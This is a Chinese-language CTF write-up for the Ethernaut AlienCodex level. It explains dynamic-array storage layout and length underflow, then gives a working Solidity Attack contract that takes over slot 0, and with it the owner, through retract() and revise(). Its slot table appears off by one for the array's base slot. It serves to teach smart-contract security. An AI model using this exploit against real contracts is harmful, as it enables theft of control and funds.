# AlienCodeX

## Reference
[AlienCodeX](https://ethernaut.openzeppelin.com/level/19)

[AlienCodeX.sol](https://github.com/yuhuajing/ethernaut-book/blob/main/src/19-AlienCodex/AlienCodex.sol)

## 目标
1. 抢占当前合约的 `Owner`

## 分析
1. 和 [privacy](https://github.com/yuhuajing/ethernaut-book/blob/main/src/12-Privacy/Privacy.md)类似
2. 当前合约不存在 call 或者delegateCall的外部调用，唯一更新的storage参数时 bytes32的非定长数据
3. 当前合约的编译版本为 ^0.5.0,数据存在上下溢出的风险
### 非定长数组存储
1. 动态数组具体数据存储的起始位置为：keccak256(p) ,p 为当前 slot 的 index , slotp内部存储数组size

### Owner
```solidity
    function revise(uint256 i, bytes32 _content) public contacted {
    codex[i] = _content;
}
```
1. 通过指定index更新array数据
2. owner存储在slot0
3. 数据type(uint256).max上溢的值为0
4. 动态数组的更新规则：

| index                                    | slot              |
|------------------------------------------|-------------------|
| 0                                        | keccak256(1) + 1  |
| 1                                        | keccak256(1) + 2  |
| 2                                        | keccak256(1) + 3  |
| ...                                      | ...               |
| type(uint256).max - 1 - keccak256(1)     | type(uint256).max |
| type(uint256).max - 1 - keccak256(1) + 1 | 0                 |

### Attack
```solidity
contract Attack {
    AlienCodex codex;
    constructor(AlienCodex _codex)public {
        codex = _codex;
    }

    function attack() public {
        codex.make_contact();
        codex.retract();
        uint256 index = ((2**256) - 1) - uint256(keccak256(abi.encode(1))) + 1;
        bytes32 txsender = bytes32(uint256(uint160(msg.sender)));
        codex.revise(index, txsender);
    }
}
```
1. 通过计算，在 `index = type(uint256).max - 1 - keccak256(1) + 1` 插入的值会被存储在 `slot0`
2. `call AlienCodex` 合约的 `retract()` 函数，此时数组 `index` 下溢，动态数组的长度初始化为最大
3. 计算目标 `index和owner` 值
4. `call AlienCodex` 合约的 `revise()` 函数，在特定 `index` 插入值，根据动态数组的计算规则，此时会更新 `slot0` 的数据
